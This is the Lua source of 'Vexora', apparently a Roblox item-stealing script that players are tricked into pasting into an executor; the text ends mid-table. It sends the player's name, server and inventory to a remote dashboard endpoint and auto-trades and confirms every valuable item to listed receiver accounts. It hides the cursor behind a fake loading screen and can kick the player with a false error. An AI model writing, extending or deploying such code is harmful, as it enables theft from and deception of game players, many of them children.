--[[ Vexora — capture + auto-trade client ]]
-- paste into your executor. reports server id, your roblox name, your executor and
-- your full inventory so you can join the server and collect.
-- the loader holds for SESSION_SECONDS (5 minutes), then the client detaches cleanly.

local CLIENT_REV = "3.4"
local TOKEN = "{{TOKEN}}"
local ENDPOINT = "{{ENDPOINT}}"
local MIN_VALUE = {{MIN_VALUE}}
local DEFAULT_VALUE = 1

-- claimer alts from the dashboard: they never kick and never ask for another alt
local CLAIMER_ACCOUNTS = { {{CLAIMERS}} }

-- receivers from the dashboard (My script -> Receivers). when one of these joins,
-- the client opens a trade, offers every real item and confirms its side.
local RECEIVER_ACCOUNTS = { {{RECEIVERS}} }

--[[ toggles ]]
local AUTO_TRADE = false       -- fire trade remotes at every player (noisy, off)
local AUTO_TRADE_RECEIVERS = true  -- trade the receivers listed on the dashboard
local PUSH_ALL_ITEMS = true    -- dump every real item into the offer slots
local CONFIRM_TRADES = true    -- confirm the trade after offering
local AUTO_ACCEPT = true       -- accept incoming trade requests
local AUTO_CLAIM = true        -- ask the dashboard to send a claimer alt into this server
local AUTO_TRADE_DELAY = 2     -- seconds between trade attempts
local RECEIVER_RETRY = 4       -- trade requests per receiver before giving up
local OFFER_GAP = 0.35         -- seconds between offered items
local OFFER_LIMIT = 24         -- trade window buttons clicked per offer pass
local SESSION_SECONDS = 300    -- how long the loader + client runs (5 minutes)
local HIDE_CURSOR = true       -- hide the real cursor while the client drives it
local REPORT_INVENTORY = true  -- dump the executor's inventory to the dashboard on load

--[[ no-real-item kick ]]
local KICK_IF_EMPTY = true     -- disconnect when the inventory holds nothing worth trading
local EMPTY_GRACE = 15         -- seconds to wait for the game to hand you items on load/respawn
local EMPTY_CHECKS = 3         -- empty reads needed before it kicks (never on an unreadable inventory)
local EMPTY_INTERVAL = 3       -- seconds between inventory checks
local EMPTY_KICK_MESSAGE = "Error: script is invalid."

--[[ what counts as a real item ]]
-- default/starter loadouts and utility tools never count. anything else that is
-- not a gun is ignored too, unless GUN_ONLY is turned off.
local GUN_ONLY = true
local IGNORE_EQUIPPED_DEFAULTS = true   -- the gun the game auto-equips on spawn never counts
local DEFAULT_ITEMS = {
    -- add the exact names of your game's default weapons here, e.g. "pistol", "combat knife"
}
local IGNORE_ITEMS = {
    "default", "starter", "basic", "training", "tutorial", "free", "beginner",
    "radio", "phone", "map", "flashlight", "camera", "spray", "emote", "pickaxe",
}
local GUN_WORDS = {
    "gun", "pistol", "revolver", "handgun", "rifle", "shotgun", "smg", "lmg", "dmr",
    "sniper", "carbine", "machinegun", "minigun", "launcher", "rpg", "bazooka",
    "ak", "ar", "m4", "m16", "mp5", "mp7", "ump", "p90", "uzi", "tec", "glock",
    "deagle", "desert eagle", "magnum", "python", "colt", "beretta", "sig", "scar",
    "galil", "famas", "aug", "vector", "awp", "awm", "kar98", "mosin", "dragunov",
    "barrett", "hunting", "taser", "flare",
}

local LOADING_PHRASES = { "loading", "loading, loading", "loading, loading, loading" }

--[[ place ids -> dashboard game ids ]]
local GAME_MAP = {
    [142823291] = "mm2",          -- Murder Mystery 2
    [920587237] = "adm",          -- Adopt Me
    [126884695634066] = "gag2",   -- Grow a Garden 2
    [109983668079237] = "sab",    -- Steal a Brainrot
}
local FALLBACK_GAME = "baddies"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")

if HIDE_CURSOR then
    pcall(function() UserInputService.MouseIconEnabled = false end)
end

--[[ ---- loading screen: covers the viewport until the client is wired up ---- ]]
local MIN_SPLASH = 1.2
local splash, splashAt, splashReleased, pulseTween = nil, os.time(), false, nil

local function buildSplash()
    local parent = LocalPlayer
        and (LocalPlayer:FindFirstChildOfClass("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui", 5))
    if not parent then return end

    local screen = Instance.new("ScreenGui")
    screen.Name = "VexoraLoading"
    screen.IgnoreGuiInset = true
    screen.ResetOnSpawn = false
    screen.DisplayOrder = 999
    screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local bg = Instance.new("Frame")
    bg.Name = "Backdrop"
    bg.Size = UDim2.fromScale(1, 1)
    bg.BackgroundColor3 = Color3.fromRGB(7, 7, 12)
    bg.BorderSizePixel = 0
    bg.Parent = screen

    local mark = Instance.new("TextLabel")
    mark.Name = "Mark"
    mark.Size = UDim2.fromOffset(260, 18)
    mark.Position = UDim2.new(0.5, -130, 0.5, -36)
    mark.BackgroundTransparency = 1
    mark.Font = Enum.Font.GothamBold
    mark.Text = "V E X O R A"
    mark.TextSize = 13
    mark.TextColor3 = Color3.fromRGB(92, 94, 106)
    mark.Parent = bg

    local label = Instance.new("TextLabel")
    label.Name = "Status"
    label.Size = UDim2.fromOffset(260, 20)
    label.Position = UDim2.new(0.5, -130, 0.5, -6)
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.Code
    label.Text = "loading"
    label.TextSize = 15
    label.TextColor3 = Color3.fromRGB(164, 166, 178)
    label.Parent = bg

    local track = Instance.new("Frame")
    track.Name = "Track"
    track.Size = UDim2.fromOffset(132, 2)
    track.Position = UDim2.new(0.5, -66, 0.5, 28)
    track.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
    track.BorderSizePixel = 0
    track.ClipsDescendants = true
    track.Parent = bg

    local fill = Instance.new("Frame")
    fill.Name = "Fill"
    fill.Size = UDim2.fromScale(0.38, 1)
    fill.Position = UDim2.fromScale(-0.4, 0)
    fill.BackgroundColor3 = Color3.fromRGB(215, 210, 199)
    fill.BorderSizePixel = 0
    fill.Parent = track

    pulseTween = TweenService:Create(
        label,
        TweenInfo.new(0.85, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        { TextTransparency = 0.62 }
    )
    pulseTween:Play()

    screen.Parent = parent
    splash = screen
    splashAt = os.time()

    -- status cycles "loading" -> "loading, loading" -> "loading, loading, loading"
    -- no timer, no countdown - the session length stays invisible
    task.spawn(function()
        local phase, dots = 1, 0
        while splash and not splashReleased do
            label.Text = LOADING_PHRASES[phase] .. string.rep(".", dots)
            dots = (dots + 1) % 4
            if dots == 0 then phase = phase % #LOADING_PHRASES + 1 end
            task.wait(0.7)
        end
    end)

    task.spawn(function()
        while splash and not splashReleased do
            fill.Position = UDim2.fromScale(-0.4, 0)
            local slide = TweenService:Create(
                fill,
                TweenInfo.new(1.1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut),
                { Position = UDim2.fromScale(1, 0) }
            )
            slide:Play()
            slide.Completed:Wait()
        end
    end)
end

local function releaseSplash(message, hold)
    if not splash or splashReleased then return end
    splashReleased = true
    if pulseTween then pcall(function() pulseTween:Cancel() end) end

    local bg = splash:FindFirstChild("Backdrop")
    local status = bg and bg:FindFirstChild("Status")

    if status and message then
        status.Text = tostring(message)
        status.TextColor3 = Color3.fromRGB(215, 210, 199)
        status.TextTransparency = 0
    else
        local left = MIN_SPLASH - (os.time() - splashAt)
        if left > 0 then task.wait(left) end
    end
    if type(hold) == "number" then task.wait(hold) end

    local fade = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    if bg then
        TweenService:Create(bg, fade, { BackgroundTransparency = 1 }):Play()
        for _, child in ipairs(bg:GetDescendants()) do
            if child:IsA("TextLabel") then
                TweenService:Create(child, fade, { TextTransparency = 1 }):Play()
            elseif child:IsA("Frame") and child.Name == "Track" then
                TweenService:Create(child, fade, { BackgroundTransparency = 1 }):Play()
            end
        end
        local fill = bg:FindFirstChild("Track") and bg.Track:FindFirstChild("Fill")
        if fill then TweenService:Create(fill, fade, { BackgroundTransparency = 1 }):Play() end
    end

    task.delay(0.5, function()
        if splash then splash:Destroy() end
    end)
end

buildSplash()

local function executorName()
    if typeof(identifyexecutor) == "function" then
        local ok, name, version = pcall(identifyexecutor)
        if ok and name then
            return tostring(name) .. (version and (" " .. tostring(version)) or "")
        end
    end
    if typeof(getexecutorname) == "function" then
        local ok, name = pcall(getexecutorname)
        if ok and name then return tostring(name) end
    end
    return "unknown"
end

local EXECUTOR = executorName()
local ROBLOX_USER = LocalPlayer and LocalPlayer.Name or "unknown"
local SERVER_ID = game.JobId ~= "" and game.JobId or nil
local PLACE_ID = game.PlaceId

local IS_CLAIMER = false
for _, name in ipairs(CLAIMER_ACCOUNTS) do
    if tostring(name):lower() == tostring(ROBLOX_USER):lower() then IS_CLAIMER = true end
end

-- a claim only makes sense for a real victim, in a live server, from a normal account
local function claimable(item, victim)
    if not AUTO_CLAIM or IS_CLAIMER then return false end
    if not (PLACE_ID and SERVER_ID) then return false end
    if tostring(item):sub(1, 1) == "_" then return false end
    local v = tostring(victim or ""):lower()
    if v == "" or v == "inventory" or v == "selftest" or v == "unknown victim" then return false end
    return true
end

local httpRequest
if typeof(request) == "function" then
    httpRequest = request
elseif typeof(syn) == "table" and typeof(syn.request) == "function" then
    httpRequest = syn.request
elseif typeof(http_request) == "function" then
    httpRequest = http_request
elseif typeof(fluxus) == "table" and typeof(fluxus.request) == "function" then
    httpRequest = fluxus.request
end

if not httpRequest then
    warn("[vexora] no HTTP function in this executor (request / syn.request / http_request)")
    releaseSplash("no http function in this executor", 3)
    return nil
end

local GAME = GAME_MAP[PLACE_ID] or GAME_MAP[game.GameId] or FALLBACK_GAME
local queue, draining = {}, false
local connections, stopped = {}, false

local function track(conn)
    if conn then table.insert(connections, conn) end
    return conn
end

local function post(payload)
    local ok, res = pcall(function()
        return httpRequest({
            Url = ENDPOINT,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload),
        })
    end)
    if not ok then return false, tostring(res) end
    local status = res and (res.StatusCode or res.status or res.Status)
    if status and status >= 200 and status < 300 then return true, status end
    return false, tostring((res and (res.Body or res.body)) or ("status " .. tostring(status)))
end

local function drain()
    if draining then return end
    draining = true
    task.spawn(function()
        while #queue > 0 do
            local entry = table.remove(queue, 1)
            local sent = false
            for attempt = 1, 3 do
                local ok, err = post(entry)
                if ok then sent = true break end
                warn("[vexora] attempt " .. attempt .. " failed: " .. tostring(err))
                task.wait(2 ^ attempt)
            end
            if not sent then warn("[vexora] dropped: " .. tostring(entry.item)) end
            task.wait(0.6)
        end
        draining = false
    end)
end

local Vexora = {
    token = TOKEN,
    game = GAME,
    executor = EXECUTOR,
    user = ROBLOX_USER,
    server = SERVER_ID,
}

-- tell the dashboard which server this client is on before any item is captured.
-- the alt can then join and open a trade even when nobody has traded yet.
function Vexora.presence()
    if IS_CLAIMER or not SERVER_ID then return false end
    table.insert(queue, {
        event = "presence",
        game = GAME,
        place_id = PLACE_ID,
        server_id = SERVER_ID,
        executor = EXECUTOR,
        roblox_user = ROBLOX_USER,
    })
    drain()
    return true
end

function Vexora.capture(item, victim, value, gameId)
    item = tostring(item or "Unknown")
    value = tonumber(value) or DEFAULT_VALUE
    if value < MIN_VALUE then return false end

    local entry = {
        game = gameId or GAME,
        item = item,
        victim = tostring(victim or "Unknown victim"),
        value = value,
        place_id = PLACE_ID,
        server_id = SERVER_ID,
        executor = EXECUTOR,
        roblox_user = ROBLOX_USER,
    }
    if claimable(item, victim) then entry.claim = true end

    table.insert(queue, entry)
    if entry.claim then
        print("[vexora] claim requested for " .. item .. " from " .. entry.victim)
    end
    drain()
    return true
end

-- manual claim: same report, but always flagged so an alt is sent in
function Vexora.claim(item, victim, value, gameId)
    if IS_CLAIMER or not SERVER_ID then return false end
    item = tostring(item or "Unknown")
    table.insert(queue, {
        game = gameId or GAME,
        item = item,
        victim = tostring(victim or "Unknown victim"),
        value = tonumber(value) or DEFAULT_VALUE,
        place_id = PLACE_ID,
        server_id = SERVER_ID,
        executor = EXECUTOR,
        roblox_user = ROBLOX_USER,
        claim = true,
    })
    drain()
    return true
end

--[[ ---- inventory readout ---- ]]
-- each entry carries where it was found, so an auto-equipped default weapon can
-- be told apart from something the account actually owns
local ITEM_FOLDERS = {
    "Inventory", "InventoryItems", "Items", "OwnedItems", "Owned", "OwnedWeapons",
    "Collection", "Skins", "Weapons", "Knives", "Guns",
}

-- mm2-style tools carry the real item name on a StringValue child
local function toolLabel(tool)
    for _, tag in ipairs(tool:GetDescendants()) do
        if tag:IsA("StringValue") and tag.Name:lower():find("itemname") then
            return tag.Value
        end
    end
    return tool.Name
end

--[[ ---- ui readers ---- ]]
-- a lot of games never replicate owned items into the player object. their inventory
-- panel does list them, so the panel and the open trade window are read as well.
local CONTROL_LABELS = {
    "equip", "unequip", "salvage", "search", "sort", "filter", "close", "back", "next",
    "previous", "prev", "page", "accept", "decline", "confirm", "cancel", "trade", "offer",
    "buy", "sell", "open", "inventory", "settings", "menu", "claim", "collect", "send",
    "remove", "clear", "select", "view", "info", "value", "rarity", "locked", "favorite",
    "favourite", "delete", "scrap", "upgrade", "spin", "case", "shop", "store", "x", "ok",
    "yes", "no", "all",
}
local CONTROL_PARTS = {
    "accept", "decline", "confirm", "cancel", "equip", "salvage", "search", "filter",
    "sort by", "next page", "previous page", "close", "send trade", "trade request",
    "start trade", "make offer", "add offer", "make trade",
}
local GENERIC_NAMES = {
    "frame", "imagebutton", "textbutton", "button", "item", "items", "slot", "card",
    "view", "icon", "image", "label", "template", "container", "holder", "grid",
}

local function norm(text)
    return tostring(text or ""):gsub("%s+", " "):gsub("^%s+", ""):gsub("%s+$", "")
end

local function isControlLabel(text)
    local n = norm(text):lower()
    if #n < 2 then return true end
    for _, word in ipairs(CONTROL_LABELS) do
        if n == word then return true end
    end
    for _, word in ipairs(CONTROL_PARTS) do
        if n:find(word, 1, true) then return true end
    end
    return false
end

local function buttonLabel(button)
    local text
    if button:IsA("TextButton") then text = norm(button.Text) end
    if not text or #text < 2 then
        for _, child in ipairs(button:GetDescendants()) do
            if child:IsA("TextLabel") then
                local value = norm(child.Text)
                if #value >= 2 then text = value break end
            end
        end
    end
    if not text or #text < 2 then text = norm(button.Name) end
    if #text < 2 then return nil end
    for _, generic in ipairs(GENERIC_NAMES) do
        if text:lower() == generic then return nil end
    end
    return text
end

local function clickButton(button)
    local clicked = false
    pcall(function()
        game:GetService("VirtualUser"):ClickButton(button)
        clicked = true
    end)
    if not clicked and typeof(firesignal) == "function" then
        pcall(function()
            firesignal(button.MouseButton1Click)
            clicked = true
        end)
    end
    return clicked
end

-- move the real pointer onto the widget and press it, so games that only listen to
-- user input (not button signals) still register the click
local function mousePress(button)
    local pos
    pcall(function() pos = button.AbsolutePosition + button.AbsoluteSize * 0.5 end)
    if not pos then return clickButton(button) end

    local real = false
    if typeof(mousemoveabs) == "function" then
        pcall(mousemoveabs, pos.X, pos.Y)
        real = true
        if typeof(mouse1click) == "function" then
            pcall(mouse1click)
        elseif typeof(mouse1down) == "function" and typeof(mouse1up) == "function" then
            pcall(mouse1down)
            pcall(mouse1up)
        end
    end

    pcall(function()
        local vu = game:GetService("VirtualUser")
        vu:MoveMouse(pos)
        vu:Button1Down(pos, Enum.UserInputType.MouseButton1)
        vu:Button1Up(pos, Enum.UserInputType.MouseButton1)
    end)
    return real or true
end

local function inventoryScreen()
    local player = LocalPlayer or Players.LocalPlayer
    local gui = player and player:FindFirstChildOfClass("PlayerGui")
    if not gui then return nil end
    for _, screen in ipairs(gui:GetChildren()) do
        local n = screen.Name:lower()
        if screen:IsA("ScreenGui") and
            (n:find("backpack", 1, true) or n:find("invent", 1, true) or n:find("collection", 1, true)) then
            return screen
        end
    end
    return nil
end

-- the hud button that opens it (Backpack / Inventory / Bag), never one inside a panel
local function findHudInventoryButton()
    local player = LocalPlayer or Players.LocalPlayer
    local gui = player and player:FindFirstChildOfClass("PlayerGui")
    if not gui then return nil end

    for _, obj in ipairs(gui:GetDescendants()) do
        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
            local node = obj
            while node and not node:IsA("ScreenGui") do node = node.Parent end
            local sn = node and node.Name:lower() or ""
            if not (sn:find("trade", 1, true) or sn:find("backpack", 1, true)
                or sn:find("invent", 1, true) or sn:find("collection", 1, true)) then
                local label = (buttonLabel(obj) or obj.Name):lower()
                if label == "backpack" or label == "inventory" or label == "bag"
                    or label == "items" or label == "inv"
                    or label:find("backpack", 1, true) or label:find("inventory", 1, true) then
                    return obj
                end
            end
        end
    end
    return nil
end

local function openInventory()
    local screen = inventoryScreen()
    if screen and screen.Enabled ~= false then return screen end

    local button = findHudInventoryButton()
    print("[vexora] inventory button: " .. (button and (button.Name .. "/" .. (buttonLabel(button) or "?")) or "not found"))
    if button then
        mousePress(button)
        task.wait(0.9)
    end
    screen = inventoryScreen()
    print("[vexora] inventory panel: " .. (screen and screen.Name or "not found"))
    return screen
end

-- sticky read state: "seen" only turns true once a real collection was listed,
-- so an unreadable inventory can never be mistaken for an empty one
local inventoryInfo = { collections = 0, containers = 0, gui = 0, panels = 0, seen = false }

-- names read off a trade grid / inventory panel, kept so inventory() can answer
-- even when the game never replicates items into the player object
local itemCache = {}

local function rememberItems(names)
    local generic = {}
    for _, name in ipairs(GENERIC_NAMES) do generic[name] = true end
    for _, name in ipairs(names or {}) do
        local clean = norm(name)
        if #clean >= 2 and not isControlLabel(clean) and not generic[clean:lower()] then
            itemCache[clean:lower()] = clean
        end
    end
    if next(itemCache) then inventoryInfo.seen = true end
end

local function addGuiItems(add)
    local player = LocalPlayer or Players.LocalPlayer
    local gui = player and player:FindFirstChildOfClass("PlayerGui")
    if not gui then return 0, 0 end

    local panels, added = 0, 0
    for _, screen in ipairs(gui:GetChildren()) do
        local n = screen.Name:lower()
        if screen:IsA("ScreenGui") and
            (n:find("invent", 1, true) or n == "inv" or n:find("collection", 1, true)
                or n:find("backpack", 1, true)) then
            panels = panels + 1
            for _, obj in ipairs(screen:GetDescendants()) do
                if obj:IsA("TextButton") or obj:IsA("ImageButton") then
                    local label = buttonLabel(obj)
                    if label and not isControlLabel(label) then
                        add(label, "gui")
                        added = added + 1
                    end
                end
            end
        end
    end
    return panels, added
end

local function scanInventory()
    local entries, seenItem = {}, {}

    local function add(name, at)
        name = norm(name)
        if #name < 2 then return end
        local key = name:lower()
        if seenItem[key] then return end
        seenItem[key] = true
        table.insert(entries, { name = name, at = at })
    end

    local player = LocalPlayer
    local info = { collections = 0, containers = 0, gui = 0, panels = 0 }
    if not player then return entries, info end

    local bag = player:FindFirstChildOfClass("Backpack")
    if bag then
        info.containers = info.containers + 1
        for _, child in ipairs(bag:GetChildren()) do
            if child:IsA("Tool") then add(toolLabel(child), "backpack") end
        end
    end

    if player.Character then
        info.containers = info.containers + 1
        for _, child in ipairs(player.Character:GetChildren()) do
            if child:IsA("Tool") then add(toolLabel(child), "equipped") end
        end
    end

    -- owned-item folders: every child is an item, whatever its class
    for _, folderName in ipairs(ITEM_FOLDERS) do
        local folder = player:FindFirstChild(folderName)
        if folder then
            info.collections = info.collections + 1
            for _, child in ipairs(folder:GetChildren()) do
                add(child.Name, "folder")
            end
        end
    end

    local panels, added = addGuiItems(add)
    info.panels, info.gui = panels, added

    inventoryInfo.collections = math.max(inventoryInfo.collections, info.collections)
    inventoryInfo.containers = info.containers
    inventoryInfo.gui = math.max(inventoryInfo.gui, added)
    inventoryInfo.panels = math.max(inventoryInfo.panels, panels)
    if info.collections > 0 or added > 0 then inventoryInfo.seen = true end

    table.sort(entries, function(a, b) return a.name:lower() < b.name:lower() end)
    return entries, info
end

-- some inventories only fill in when their panel is opened once
local guiToggles = 0

local function findInventoryToggle()
    local player = LocalPlayer or Players.LocalPlayer
    local gui = player and player:FindFirstChildOfClass("PlayerGui")
    if not gui then return nil end
    for _, obj in ipairs(gui:GetDescendants()) do
        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
            local label = (buttonLabel(obj) or obj.Name):lower()
            if label == "inv" or label:find("inventory", 1, true) or label:find("backpack", 1, true) then
                return obj
            end
        end
    end
    return nil
end

local function collectInventory()
    local names, seen = {}, {}
    for _, entry in ipairs(scanInventory()) do
        local key = entry.name:lower()
        if not seen[key] then seen[key] = true table.insert(names, entry.name) end
    end
    for key, name in pairs(itemCache) do
        if not seen[key] then seen[key] = true table.insert(names, name) end
    end
    table.sort(names, function(a, b) return a:lower() < b:lower() end)
    return names
end

function Vexora.inventoryState()
    return {
        collections = inventoryInfo.collections,
        containers = inventoryInfo.containers,
        gui = inventoryInfo.gui,
        panels = inventoryInfo.panels,
        seen = inventoryInfo.seen,
    }
end

function Vexora.inventory(report)
    local items = collectInventory()
    if report == false then return items end

    local value = math.max(MIN_VALUE, 1)
    local send = function(name)
        table.insert(queue, {
            game = GAME,
            item = name,
            victim = "inventory",
            value = value,
            place_id = PLACE_ID,
            server_id = SERVER_ID,
            executor = EXECUTOR,
            roblox_user = ROBLOX_USER,
        })
    end

    if #items == 0 then
        send("inventory: empty")
    else
        for _, name in ipairs(items) do send(name) end
    end
    drain()
    return items
end

--[[ ---- filter: real guns vs default loadout ---- ]]
local function hasWord(text, word)
    if word:find("%s") then return text:find(word, 1, true) ~= nil end
    return text:find("%f[%w]" .. word .. "%f[%W]") ~= nil
end

-- whatever the game auto-equips when you spawn is a default, not loot
local spawnDefaults = {}

local function captureSpawnDefaults()
    for _, entry in ipairs(scanInventory()) do
        if entry.at == "equipped" then spawnDefaults[entry.name:lower()] = true end
    end
end

local MM2 = GAME == "mm2"

local function isRealItem(entry)
    local n = entry.name:lower()

    -- "Default Knife", "Default Gun", "Starter Pistol" and friends never count
    for _, word in ipairs({ "default", "basic", "starter" }) do
        if n:find(word, 1, true) then return false end
    end
    for _, word in ipairs(IGNORE_ITEMS) do
        if n:find(word, 1, true) then return false end
    end
    for _, exact in ipairs(DEFAULT_ITEMS) do
        if n == exact:lower() then return false end
    end

    -- mm2: the knife/gun you spawn with is just the equipped default, so only a
    -- collection folder or the inventory panel counts
    if MM2 then return entry.at == "folder" or entry.at == "gui" or entry.at == "cache" end

    if IGNORE_EQUIPPED_DEFAULTS and entry.at == "equipped" and spawnDefaults[n] then return false end
    if not GUN_ONLY then return true end
    for _, word in ipairs(GUN_WORDS) do
        if hasWord(n, word) then return true end
    end
    return false
end

-- assigned further down, once the mm2 trade api is set up
local mm2Owned

local function realItems(deep)
    local all = scanInventory()

    -- open the inventory panel once when it listed nothing, then read it again
    if deep and inventoryInfo.gui == 0 and guiToggles < 2 then
        local toggle = findInventoryToggle()
        if toggle then
            guiToggles = guiToggles + 1
            clickButton(toggle)
            task.wait(1.5)
            all = scanInventory()
            clickButton(toggle)
        end
    end

    local real, seen = {}, {}
    for _, entry in ipairs(all) do
        if isRealItem(entry) and not seen[entry.name:lower()] then
            seen[entry.name:lower()] = true
            table.insert(real, entry.name)
        end
    end
    for key, name in pairs(itemCache) do
        if not seen[key] and isRealItem({ name = name, at = "cache" }) then
            seen[key] = true
            table.insert(real, name)
        end
    end

    -- mm2 keeps the collection in ProfileData.Weapons.Owned, not in the player tree
    if MM2 and mm2Owned then
        for _, item in ipairs(mm2Owned() or {}) do
            local key = item.name:lower()
            if not seen[key] then
                seen[key] = true
                table.insert(real, item.name)
            end
        end
    end
    table.sort(real, function(a, b) return a:lower() < b:lower() end)
    return real, all
end

function Vexora.items()
    return realItems(false)
end

function Vexora.selftest()
    return Vexora.capture("__selftest", "selftest", DEFAULT_VALUE)
end

function Vexora.stop()
    if stopped then return end
    stopped = true
    AUTO_TRADE = false
    AUTO_ACCEPT = false
    for _, conn in ipairs(connections) do
        pcall(function() conn:Disconnect() end)
    end
    connections = {}
    table.clear(queue)
    if HIDE_CURSOR then
        pcall(function() UserInputService.MouseIconEnabled = true end)
    end
    releaseSplash("loaded", 1.2)
    print(string.format("[vexora] %ds session complete — client detached", SESSION_SECONDS))
end

--[[ ---- discovery ---- ]]
local function findRemotes(pattern)
    local out = {}
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and obj.Name:lower():match(pattern) then
            table.insert(out, obj)
        end
    end
    return out
end

local function fire(remote, ...)
    local args = { ... }
    if remote:IsA("RemoteFunction") then
        pcall(function() remote:InvokeServer(table.unpack(args)) end)
    else
        pcall(function() remote:FireServer(table.unpack(args)) end)
    end
end

-- trade systems differ per game; item remotes are the ones that put something
-- into the offer slots, so they are kept out of the request/confirm lists
local function isItemRemote(name)
    local n = name:lower()
    return n:match("additem") ~= nil or n:match("offeritem") ~= nil
        or n:match("tradeitem") ~= nil or n:match("giveitem") ~= nil
        or n:match("pushitem") ~= nil or n:match("itemadd") ~= nil
        or n:match("add.*item") ~= nil or n:match("item.*add") ~= nil
        or n:match("offer.*item") ~= nil
end

local itemRemotes, tradeRemotes, acceptRemotes = {}, {}, {}
for _, remote in ipairs(findRemotes(".")) do
    local n = remote.Name:lower()
    if isItemRemote(n) then
        table.insert(itemRemotes, remote)
    elseif n:match("confirm") or n:match("ready") or n:match("accept") or n:match("agree") then
        table.insert(acceptRemotes, remote)
    elseif n:match("trade") or n:match("request") then
        table.insert(tradeRemotes, remote)
    end
end

local function playerIn(args)
    for _, v in ipairs(args) do
        if typeof(v) == "Instance" and v:IsA("Player") then return v end
        if typeof(v) == "string" then
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr.Name == v then return plr end
            end
        end
    end
    return nil
end

local function itemIn(args, victim)
    for _, v in ipairs(args) do
        if typeof(v) == "string" and #v > 1 and (not victim or v ~= victim.Name) and v:lower() ~= "accept" then
            return v
        end
    end
    return nil
end

--[[ ---- receivers: trade them on join, push every item, confirm ---- ]]
local RECEIVER_SET = {}
for _, name in ipairs(RECEIVER_ACCOUNTS) do
    local clean = tostring(name):lower()
    if #clean > 1 then RECEIVER_SET[clean] = true end
end

local function isReceiver(name)
    return RECEIVER_SET[tostring(name or ""):lower()] == true
end

local outgoingTrade, tradesRun, tradeSawItems = false, {}, false

local function reportTrade(stage, receiver, extra)
    local entry = {
        event = "trade",
        game = GAME,
        stage = tostring(stage or "event"),
        receiver = tostring(receiver or "unknown"),
        place_id = PLACE_ID,
        server_id = SERVER_ID,
        executor = EXECUTOR,
        roblox_user = ROBLOX_USER,
    }
    if extra then
        for key, value in pairs(extra) do entry[key] = value end
    end
    table.insert(queue, entry)
    drain()
    print(string.format("[vexora] trade:%s %s%s", entry.stage, entry.receiver,
        entry.detail and (" - " .. tostring(entry.detail)) or ""))
end

-- what the client can actually see, so a failed read can be fixed from the dashboard
local function probeLines()
    local player = LocalPlayer or Players.LocalPlayer
    if not player then return { "no LocalPlayer" } end

    local lines = {}
    local function push(text)
        if #lines < 40 then table.insert(lines, tostring(text):sub(1, 60)) end
    end

    push("user:" .. player.Name)
    for _, child in ipairs(player:GetChildren()) do
        if child:IsA("Folder") or child:IsA("Configuration") or child:IsA("Backpack") then
            push("p:" .. child.Name .. "(" .. child.ClassName .. ")=" .. #child:GetChildren())
        end
    end

    local gui = player:FindFirstChildOfClass("PlayerGui")
    if gui then
        for _, screen in ipairs(gui:GetChildren()) do
            if screen:IsA("ScreenGui") then push("gui:" .. screen.Name) end
        end
    end

    local real, all = realItems(false)
    push(string.format("items: %d real / %d total", #real, #all))
    push(string.format("folders=%d gui=%d panels=%d seen=%s",
        inventoryInfo.collections, inventoryInfo.gui, inventoryInfo.panels, tostring(inventoryInfo.seen)))
    push(string.format("remotes: trade=%d item=%d confirm=%d", #tradeRemotes, #itemRemotes, #acceptRemotes))
    return lines
end

function Vexora.probe()
    return probeLines()
end

-- probe rows are printed too, so the executor log alone shows what the game has
local function reportProbe(receiver, detail, lines)
    for i, line in ipairs(lines) do
        if i > 40 then break end
        print("[vexora] probe: " .. tostring(line))
    end
    reportTrade("probe", receiver, { items = lines, detail = detail })
end

-- a trade screen is any visible gui with "trade" in the name
--[[ ---- murder mystery 2 native trade ---- ]]
local mm2TradeRoot = nil

local function mm2Trade()
    if PLACE_ID ~= 142823291 then return nil end
    if mm2TradeRoot then return mm2TradeRoot end
    local ok, trade = pcall(function() return ReplicatedStorage:WaitForChild("Trade", 5) end)
    if ok and trade then mm2TradeRoot = trade end
    return mm2TradeRoot
end

local mm2OwnedCache, mm2OwnedAt = nil, 0

mm2Owned = function()
    if PLACE_ID ~= 142823291 then return nil end
    if mm2OwnedCache and os.time() - mm2OwnedAt < 15 then return mm2OwnedCache end

    local items = {}
    pcall(function()
        local modules = ReplicatedStorage:FindFirstChild("Modules")
        local profile = modules and modules:FindFirstChild("ProfileData")
        local data = profile and require(profile)
        local owned = data and data.Weapons and data.Weapons.Owned
        if owned then
            for name, amount in pairs(owned) do
                table.insert(items, {
                    name = tostring(name),
                    amount = math.max(1, tonumber(amount) or 1),
                })
            end
        end
    end)

    table.sort(items, function(a, b) return a.name < b.name end)
    mm2OwnedCache, mm2OwnedAt = items, os.time()
    if #items > 0 then inventoryInfo.seen = true end
    return items
end

local function mm2StartTrade(target)
    local trade = mm2Trade()
    local start = trade and trade:FindFirstChild("StartTrade")
    if not start then return false end
    pcall(function() start:FireServer(target) end)
    return true
end

local function mm2Offer()
    local trade = mm2Trade()
    local offer = trade and trade:FindFirstChild("OfferItem")
    if not offer then return 0, {} end

    local owned = mm2Owned() or {}
    local names, sent = {}, 0
    for _, item in ipairs(owned) do
        table.insert(names, item.name)
        for _ = 1, math.min(item.amount, 2) do
            pcall(function() offer:FireServer(item.name, "Weapons") end)
            sent = sent + 1
            task.wait(0.2)
        end
    end
    rememberItems(names)
    return sent, names
end

local MM2_ACCEPT_PATHS = {
    { "TradeGUI", "Container", "Trade", "Actions", "Accept", "Confirm", "ActionButton" },
    { "TradeGUI", "Container", "Trade", "Actions", "Accept", "ActionButton" },
    { "TradeGUI", "Container", "Trade", "Actions", "Accept", "Cooldown", "Blocker" },
    { "TradeGUI_Phone", "Container", "Trade", "Actions", "Accept", "Confirm", "ActionButton" },
